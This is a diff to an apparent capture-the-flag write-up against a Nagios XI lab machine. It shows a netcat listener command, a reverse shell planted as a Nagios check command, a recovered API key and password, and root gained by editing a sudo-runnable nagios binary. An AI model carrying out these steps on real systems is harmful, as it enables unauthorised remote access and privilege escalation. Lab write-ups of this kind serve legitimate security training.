@@ -262,12 +262,12 @@ action=acknowledge_banner_message&id=2
 
 **FInal API Key:
 
-```bash
+```shell
 IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
 ```
 
 
-## Creating an user:
+## Creating a user
 
 also looking at this exploit from Exploit DB
 
@@ -283,8 +283,73 @@ I was able to create an user and login without requiring the token.
 
 they required me to change the password and I changed it to:
 
-```bash
+```shell
 password1
 ```
 
 
+## Command Execution via Nagios Panel
+
+
+Accessed the Command management menu in Nagios and added a bash reverse shell as a new command.
+
+``navigation > configure > core config manager > commands > create new command
+
+![](images/image16.png.png)
+
+`save command > apply configuration` then `navigation > configure > core config manager > services > add new > Check Command = reverse shell`
+
+![](images/image17.png.png)
+
+next we can open a Netcat listener matching the port of the command we created earlier in Nagios
+
+```shell
+nc -lvnp 4444
+```
+
+
+next we just need to run the command in order to get a connection back to our reverse shell:
+
+
+![](images/image18.png.png)
+
+
+![](images/image19.png.png)
+
+**Flag** :
+
+![](images/image20.png.png)
+
+
+### Privilege Escalation
+
+I originally went in the Nagios folder to check the configuration files but did not find anything interesting there. I then ran `sudo -l` to see if there was something interesting that we could do.
+
+![](images/image21.png.png)
+
+Based on what we see, we just need to modify the `nagios` binary in order to obtain a Root shell and we actually have the rights.
+
+
+```shell
+cd /usr/local/nagios/bin
+```
+
+```shell
+nano nagios
+```
+
+added a **reverse shell** in the file:
+
+![](images/image22.png.png)
+
+```shell
+chmod +x nagios
+```
+
+Executed the command and got root:
+
+```
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios  
+```
+
+![](image23.png.png)
